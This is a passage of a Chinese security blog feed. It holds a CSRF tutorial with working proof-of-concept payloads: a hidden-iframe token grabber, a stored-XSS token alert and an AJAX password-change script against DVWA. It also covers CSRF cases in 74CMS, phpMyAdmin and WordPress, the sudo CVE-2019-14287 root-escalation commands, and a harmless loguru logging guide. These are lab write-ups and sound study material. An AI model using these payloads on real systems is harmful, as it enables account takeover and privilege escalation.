class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value = <span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit();</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">    &lt;iframe src="http:/</span><span class="regexp">/192.168.1.106/</span>vulnerabilities/csrf<span class="string">" id="</span>hack<span class="string">" border="</span><span class="number">0</span><span class="string">" style="</span>display:none;<span class="string">"&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &lt;body onload="</span>attack()<span class="string">"&gt;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &lt;form method="</span>GET<span class="string">" id="</span>transfer<span class="string">" action="</span>http:<span class="comment">//192.168.1.106/vulnerabilities/csrf"&gt;</span></span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"attack"</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"attack"</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_token"</span> value=<span class="string">""</span>&gt;</span><br><span class="line"> </span><br><span class="line">            &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span>&gt;</span><br><span class="line"> </span><br><span class="line">        &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p>测试一下：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869029.13.png" alt></p><p>为什么会出现这种情况：因为现在的浏览器、基本都不会允许跨域的操作，我们的框架iframe访问的地址是<a href="http://192.168.1.106/vulnerabilities/csrf" target="_blank" rel="noopener">http://192.168.1.106/vulnerabilities/csrf</a>，位于服务器192.168.1.106上，而我们的攻击页面位于黑客服务器192.168.1.101上，两者的域名不同，域名B下的所有页面都不被允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。</p><p>理想和现实的差距是比较大的，这次直接在目标站点上放上POC测试(不跨域的情况下，当然，既然能上传了，还挖什么CSRF呀，手动滑稽)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869404.4.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568869465.77.png" alt></p><p>可以看到，在理想情况下，成功获取到user_token,触发CSRF漏洞，将用户密码改为admin888</p><p><strong>理想情况测试完后，想想怎么绕过：组合漏洞，通过XSS获取用户的user_token，然后结合CSRF触发</strong></p><p>首先在存储型XSS的name处注入代码，触发存储型XSS漏洞，弹出user_token</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">"../csrf"</span> onload=alert(frames[<span class="number">0</span>].document.getElementsByName(<span class="string">"user_token"</span>)[<span class="number">0</span>].value)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872357.86.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872377.73.png" alt></p><p>可以看到代码已经注入进去了，利用存储型XSS获取user_token,然后在CSRF处修改密码抓包生成POC替换user_token值既可触发CSRF漏洞<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872555.58.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872610.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568872638.08.png" alt></p><p>可以看到漏洞触发，密码被修改。</p><h4 id="方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）"><a href="#方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）" class="headerlink" title="方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）"></a>方法二：结合xss调用外链通过ajax实现CSRF（没实现，后面补上）</h4><p>CSRF结合同Security Level的 XSS漏洞，通过ajax实现跨域请求来获取用户的user_token</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://192.168.1.106/vulnerabilities/csrf/'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="built_in">console</span>.log(match);</span><br><span class="line">        alert(match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> new_url = <span class="string">'http://192.168.1.106/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new=test&amp;password_conf=test&amp;Change=Change'</span>;</span><br><span class="line">                <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">                    xmlhttp.send();</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h3><blockquote><p>在前面dvwa的high等级中，对于csrf的防御点就在于user_token，通过token可以进行身份鉴别，当然，在没有登录的情况下只能通过组合漏洞获取token或者看看有没有token泄露；除此之外，token在登录的情况下(即以及获取到token的情况下)除了身份鉴别之外，还可以防止重放，因为数据包的重放每次都要更新token，所以在以token为重放判定的情况下，怎么不断重新获取token呢，当然不能手动获取，burp上有插件实现了cookie的更新(有些情况是把token加在cookie中的)，但是对于没有在cookie中的token，可以通过CSRF Token Tracker插件实现自动更新，表面意思是只能更新csrf——token，其实都可以。这样在某些场景，比如短信轰炸啥的就可以突破了，还有些服务端有下发sign的情况，这种插件目前没有发现。</p></blockquote><p>以dvwa中CSRF的high等级为例</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875700.86.png" alt></p><p>没有更新token时修改密码重放<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875765.59.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876011.68.png" alt></p><p>实时更新token测试<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568875932.29.png" alt></p><h2 id="CSRF实战——74CMS"><a href="#CSRF实战——74CMS" class="headerlink" title="CSRF实战——74CMS"></a>CSRF实战——74CMS</h2><h3 id="登录74CMS的后台进行添加管理员操作并抓包"><a href="#登录74CMS的后台进行添加管理员操作并抓包" class="headerlink" title="登录74CMS的后台进行添加管理员操作并抓包"></a>登录74CMS的后台进行添加管理员操作并抓包</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876799.13.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876817.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568876946.98.png" alt></p><p>无token且服务端没有验证referer，直接生成POC测试</p><h3 id="生成POC，添加管理账户"><a href="#生成POC，添加管理账户" class="headerlink" title="生成POC，添加管理账户"></a>生成POC，添加管理账户</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877019.83.png" alt></p><p>返回后台查看，发现用户已经添加成功<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877075.24.png" alt></p><h3 id="使用添加的账号登录"><a href="#使用添加的账号登录" class="headerlink" title="使用添加的账号登录"></a>使用添加的账号登录</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877183.91.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877231.37.png" alt></p><h2 id="CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF"><a href="#CSRF实战——phpMyAdmin-4-7-x-XSRF-CSRF" class="headerlink" title="CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF"></a>CSRF实战——phpMyAdmin 4.7.x XSRF/CSRF</h2><blockquote><p>环境半天打不开哦，直接截图了</p></blockquote><h3 id="登录靶机"><a href="#登录靶机" class="headerlink" title="登录靶机"></a>登录靶机<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1568877618.55.png" alt></h3><h3 id="利用SQL语句更新密码，构造POC"><a href="#利用SQL语句更新密码，构造POC" class="headerlink" title="利用SQL语句更新密码，构造POC"></a>利用SQL语句更新密码，构造POC</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> passsword=<span class="keyword">PASSWORD</span>(<span class="string">'demos'</span>);</span><br><span class="line"> </span><br><span class="line">http://f1496b741e86dce4b2f79f3e839f977d.vsplate.me:19830/pma/sql.php?db=mysql&amp;table=user&amp;sql_query=<span class="keyword">SET</span>%<span class="number">20</span><span class="keyword">password</span></span><br><span class="line">%<span class="number">20</span>=%<span class="number">20</span><span class="keyword">PASSWORD</span>(%<span class="number">27</span>demos%<span class="number">27</span>)</span><br></pre></td></tr></table></figure><p>然后即可利用短域名伪装发送，在这种特定场景下，还可以利用SQL语句进行写shell。</p><h2 id="CSRF实战——wordpress5-2-4"><a href="#CSRF实战——wordpress5-2-4" class="headerlink" title="CSRF实战——wordpress5.2.4"></a>CSRF实战——wordpress5.2.4</h2><blockquote><p>在后台添加账户处存在csrf，可以利用此处漏洞诱导管理员点击添加管理员账户</p></blockquote><p>没有referer和token、origin验证</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716416.22.png" alt></p><p>直接通过burp抓包生产CSRF-POC在浏览器测试</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716515.04.png" alt></p><p>结果如下</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571716543.41.png" alt></p><h2 id="组合拳"><a href="#组合拳" class="headerlink" title="组合拳"></a>组合拳</h2><blockquote><p>记录一些学习到的思路</p></blockquote><ul><li><p>CSRF结合XSS形成上下文漏洞，绕过限制</p></li><li><p>CSRF结合URL跳转绕过限制</p></li><li><p><a href="https://gh0st.cn/archives/2018-04-28/1" target="_blank" rel="noopener">CSRF结合点击劫持拿下权限</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个思路比较有意思，首先有些平台会存在绑定第三方账号的功能，在已经登录的情况下，点击劫持伪造登录，诱导攻击者点击从而登录第三方账号(攻击者自己的账号),登录后iframe直接跳转到绑定的界面，然后劫持用户继续点击绑定，从而使得受害者在平台上绑定的第三方账号是攻击者注册的小号，从而利用这种思路劫持到受害者平台的权限。</span><br></pre></td></tr></table></figure></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF的漏洞挖掘方式，在用户可以增删改(大多数情况)查(jsonp跨、flash跨域、cors跨域)，查看数据包中是否又token、目标表单是否又验证码、目标数据包是否验证了referer来源，json数据是否可以自定义callback函数、flash网站根目录下的crossdomain.xml 中的”access-from domain”是否为通配符、cors、websocket是否验证origin来源。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/118352.html</a></p><p><a href="https://xz.aliyun.com/t/6128#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/6128#toc-16</a></p><p><a href="https://www.vulnspy.com/?u=pmasa-2017-9" target="_blank" rel="noopener">https://vulnspy.com/?u=pmasa-2017-9</a></p><p><a href="https://xz.aliyun.com/t/5871#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5871#toc-3</a></p><p><a href="https://c1h2e1.github.io/#" target="_blank" rel="noopener">https://c1h2e1.github.io/#</a></p><p><a href="https://gh0st.cn/archives/2018-03-22/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-03-22/1</a></p><p><a href="https://gh0st.cn/archives/2019-03-20/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2019-03-20/1</a></p><p><a href="https://www.cnblogs.com/chyingp/p/websocket-deep-in.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/p/websocket-deep-in.html</a></p><p><a href="https://xz.aliyun.com/t/5143" target="_blank" rel="noopener">JSONP绕过CSRF防护token </a></p><p><a href="https://gh0st.cn/archives/2018-08-01/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-08-01/1</a></p><p><a href="https://gh0st.cn/archives/2018-04-28/1" target="_blank" rel="noopener">https://gh0st.cn/archives/2018-04-28/1</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CSRF（跨站请求伪造）&quot;&gt;&lt;a href=&quot;#CSRF（跨站请求伪造）&quot; class=&quot;headerlink&quot; title=&quot;CSRF（跨站请求伪造）&quot;&gt;&lt;/a&gt;CSRF（跨站请求伪造）&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;cross-site reques
      
    
    </summary>
    
      <category term="web前端相关" scheme="https://www.lsowl.top/categories/web%E5%89%8D%E7%AB%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="web前端" scheme="https://www.lsowl.top/tags/web%E5%89%8D%E7%AB%AF/"/>
    
      <category term="CSRF" scheme="https://www.lsowl.top/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14287 linux sudo版本小于1.8.28本地root权限提升</title>
    <link href="https://www.lsowl.top/2019/10/16/CVE-2019-14287-linux-sudo%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8E1-8-28%E6%9C%AC%E5%9C%B0root%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://www.lsowl.top/2019/10/16/CVE-2019-14287-linux-sudo版本小于1-8-28本地root权限提升/</id>
    <published>2019-10-15T16:32:00.000Z</published>
    <updated>2019-10-15T16:34:01.203Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>当sudo配置为允许用户以任意方式运行命令时用户通过Runas规范中的ALL关键字，可以通过指定用户ID为-1或4294967295以root用户身份执行命令。</p><p>具有足够sudo权限的用户可以使用它来运行Runas规范明确禁止使用的root命令，以这种方式运行的命令的日志条目将列出目标用户为4294967295而不是root。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="查看sudo版本"><a href="#查看sudo版本" class="headerlink" title="查看sudo版本"></a>查看sudo版本</h4><p><code>sudo -V</code></p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571156178.5.png" alt></p><h4 id="为新增加的toml用户修改-etc-sudoers文件"><a href="#为新增加的toml用户修改-etc-sudoers文件" class="headerlink" title="为新增加的toml用户修改/etc/sudoers文件"></a>为新增加的toml用户修改/etc/sudoers文件</h4><p>限制权限</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571156430.1.png" alt></p><p>本地权限提升</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 id</span></span><br><span class="line">sudo -u<span class="comment">#4294967295 id</span></span><br><span class="line">sudo -u<span class="comment">#-1 /bin/bash</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571156890.88.png" alt></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://segmentfault.com/a/1190000020694980" target="_blank" rel="noopener">https://segmentfault.com/a/1190000020694980</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h3&gt;&lt;p&gt;当sudo配置为允许用户以任意方式运行命令时用户通过Runas规范中的ALL关键字，可以通过指定用户ID为-1或429496
      
    
    </summary>
    
      <category term="权限提升" scheme="https://www.lsowl.top/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    
      <category term="提权" scheme="https://www.lsowl.top/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="渗透" scheme="https://www.lsowl.top/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Python 中更优雅的日志记录方案——loguru</title>
    <link href="https://www.lsowl.top/2019/10/14/Python-%E4%B8%AD%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E6%96%B9%E6%A1%88%E2%80%94%E2%80%94loguru/"/>
    <id>https://www.lsowl.top/2019/10/14/Python-中更优雅的日志记录方案——loguru/</id>
    <published>2019-10-14T02:39:47.000Z</published>
    <updated>2019-10-14T02:42:40.202Z</updated>
    
    <content type="html"><![CDATA[<h3 id="python日志记录方案"><a href="#python日志记录方案" class="headerlink" title="python日志记录方案"></a>python日志记录方案</h3><blockquote><p>在 Python 中，一般情况下我们可能直接用自带的 logging 模块来记录日志，包括我之前的时候也是一样。在使用时我们需要配置一些 Handler、Formatter 来进行一些处理，比如把日志输出到不同的位置，或者设置一个不同的输出格式，或者设置日志分块和备份。但其实个人感觉 logging 用起来其实并不是那么好用，其实主要还是配置较为繁琐。</p></blockquote><h3 id="更优雅的方式"><a href="#更优雅的方式" class="headerlink" title="更优雅的方式"></a>更优雅的方式</h3><p><strong>loguru</strong></p><blockquote><p>loguru不需要配置什么东西，直接引入一个 logger，然后调用其 debug 方法即可。在 loguru 里面有且仅有一个主要对象，那就是 logger，loguru 里面有且仅有一个 logger，而且它已经被提前配置了一些基础信息，比如比较友好的格式化、文本颜色信息等等。</p></blockquote><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><code>pip3 install loguru</code></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="输出日志"><a href="#输出日志" class="headerlink" title="输出日志"></a>输出日志</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br></pre></td></tr></table></figure><h5 id="输出到文件"><a href="#输出到文件" class="headerlink" title="输出到文件"></a>输出到文件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_&#123;time&#125;.log"</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br><span class="line">logger.info(<span class="string">"这是一条info日志"</span>)</span><br></pre></td></tr></table></figure><h5 id="日志规则"><a href="#日志规则" class="headerlink" title="日志规则"></a>日志规则</h5><p>设置日志格式，过滤器，日志级别</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file.log"</span>, format=<span class="string">"&#123;time&#125; &#123;level&#125; &#123;message&#125;"</span>, filter=<span class="string">""</span>, level=<span class="string">"INFO"</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br><span class="line">logger.info(<span class="string">"这是一条info日志"</span>)</span><br></pre></td></tr></table></figure><h5 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h5><p>文件管理方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">logger.add(<span class="string">"file_1.log"</span>, rotation=<span class="string">"500 MB"</span>)    <span class="comment"># 文件过大就会重新生成一个文件</span></span><br><span class="line">logger.add(<span class="string">"file_2.log"</span>, rotation=<span class="string">"12:00"</span>)     <span class="comment"># 每天12点创建新文件</span></span><br><span class="line">logger.add(<span class="string">"file_3.log"</span>, rotation=<span class="string">"1 week"</span>)    <span class="comment"># 文件时间过长就会创建新文件</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_X.log"</span>, retention=<span class="string">"10 days"</span>)  <span class="comment"># 一段时间后会清空</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_Y.log"</span>, compression=<span class="string">"zip"</span>)    <span class="comment"># 保存zip格式</span></span><br></pre></td></tr></table></figure><h5 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logger.add(<span class="string">"somefile.log"</span>, enqueue=<span class="keyword">True</span>)  <span class="comment"># 异步写入</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"somefile.log"</span>, serialize=<span class="keyword">True</span>)  <span class="comment"># 序列化为json</span></span><br></pre></td></tr></table></figure><h5 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.add(<span class="string">"file.log"</span>, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125; | &#123;level&#125; | &#123;message&#125;"</span>)</span><br></pre></td></tr></table></figure><p>配合notifiers模块<br>github： <a href="https://github.com/notifiers/notifiers" target="_blank" rel="noopener">https://github.com/notifiers/notifiers</a><br>文档：<a href="https://notifiers.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://notifiers.readthedocs.io/en/latest/</a></p><h5 id="在工程中创建多个文件处理器对象并解决中文乱码问题"><a href="#在工程中创建多个文件处理器对象并解决中文乱码问题" class="headerlink" title="在工程中创建多个文件处理器对象并解决中文乱码问题"></a>在工程中创建多个文件处理器对象并解决中文乱码问题</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line"></span><br><span class="line">log_file_path = os.path.join(BASE_DIR,<span class="string">'Log/my_first.log'</span>)</span><br><span class="line">err_log_file_path = os.path.join(BASE_DIR,<span class="string">'Log/error.log'</span>)</span><br><span class="line"></span><br><span class="line">logger.add(sys.stderr, format=<span class="string">"&#123;time&#125; &#123;level&#125; &#123;message&#125;"</span>, filter=<span class="string">"my_noudle"</span>, level=<span class="string">"INFO"</span>)</span><br><span class="line"></span><br><span class="line">logger.add(log_file_path, rotation=<span class="string">"500 MB"</span>, encoding=<span class="string">'utf-8'</span>)  <span class="comment"># Automatically rotate too big file</span></span><br><span class="line">logger.add(err_log_file_path, rotation=<span class="string">"500 MB"</span>, encoding=<span class="string">'utf-8'</span>,</span><br><span class="line">           level=<span class="string">'ERROR'</span>)  <span class="comment"># Automatically rotate too big file</span></span><br><span class="line">logger.debug(<span class="string">"That's it, beautiful and simple logging!"</span>)</span><br><span class="line">logger.debug(<span class="string">"中文日志可以不"</span>)</span><br><span class="line">logger.error(<span class="string">"严重错误"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571020366.4.png" alt></p><h5 id="Traceback-记录"><a href="#Traceback-记录" class="headerlink" title="Traceback 记录"></a>Traceback 记录</h5><blockquote><p>在很多情况下，如果遇到运行错误，而我们在打印输出 log 的时候万一不小心没有配置好 Traceback 的输出，很有可能我们就没法追踪错误所在了。但用了 loguru 之后，我们用它提供的装饰器就可以直接进行 Traceback 的记录。<strong>用 loguru 可以非常方便地实现日志追踪</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"><span class="meta">@logger.catch</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_function</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">    <span class="comment"># An error? It's caught anyway!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (x + y + z)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_function(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571020539.21.png" alt></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzA4NDk3Nw==&amp;mid=2457738232&amp;idx=1&amp;sn=bfc6437b494249270d2b6dc3469eda61&amp;chksm=ff44b3a6c8333ab010268aed413da647f711839dbf8ba8b73d06b9502a4ba95482b11606f81b&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1571014978932&amp;sharer_shareid=b4f68ebe4eb5286506b3d3b1a76fd4c7#rd" target="_blank" rel="noopener">Python 中更优雅的日志记录方案</a></p><p><a href="https://loguru.readthedocs.io/en/stable/index.html" target="_blank" rel="noopener">loguru官方文档</a></p><p><a href="http://www.manongjc.com/detail/8-xkpixvxrrbkbqxw.html" target="_blank" rel="noopener">Python 第三方日志框架loguru使用</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;python日志记录方案&quot;&gt;&lt;a href=&quot;#python日志记录方案&quot; class=&quot;headerlink&quot; title=&quot;python日志记录方案&quot;&gt;&lt;/a&gt;python日志记录方案&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;在 Python 中，一般情况下我
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.top/categories/python/"/>
    
    
      <category term="编程" scheme="https://www.lsowl.top/tags/%E7%BC%96%E7%A8%8B/"/>
